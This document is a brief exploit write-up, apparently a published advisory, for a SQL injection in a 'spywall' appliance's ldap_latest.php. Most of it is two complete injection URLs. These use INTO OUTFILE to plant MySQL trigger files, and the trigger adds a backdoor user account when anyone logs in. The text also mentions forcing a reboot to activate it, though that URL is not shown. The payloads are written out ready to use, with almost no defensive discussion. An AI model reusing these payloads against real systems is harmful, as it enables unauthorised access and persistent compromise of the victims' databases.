Accessing the following URLs will create a new trigger that will create a user account on the victim database:

https://server/spywall/ldap_latest.php?ip=1 union select 'TYPE=TRIGGERNAME' into outfile '/var/lib/mysql/spywall_db/ins_trig.TRN' LINES TERMINATED BY '\ntrigger_table=eventlog\n';--

https://server/spywall/ldap_latest.php?ip=1 union select 'TYPE=TRIGGERS' into outfile '/var/lib/mysql/spywall_db/eventlog.TRG' LINES TERMINATED BY '\ntriggers=\'CREATE DEFINER=`shadm`@`localhost` trigger ins_trig after insert on eventlog\\nfor each row\\nbegin\\nINSERT INTO users VALUES("muts","21232f297a57a5a743894a0e4a801fc3","NULL","4773","2","3","N/A","0","0","0","","hacker@offsec.com","1336255408","0","0","0");\\nend\'\nsql_modes=0\ndefiners=\'shadm@localhost\'\nclient_cs_names=\'latin1\'\nconnection_cl_names=\'latin1_swedish_ci\'\ndb_cl_names=\'latin1_swedish_ci\'\n';--

With the MySQL trigger in place, an authenticated user can initiate a reboot of the remote system by accessing the following URL. When a user logs back in to the application, the trigger will be activated and the new user will be added to the system.
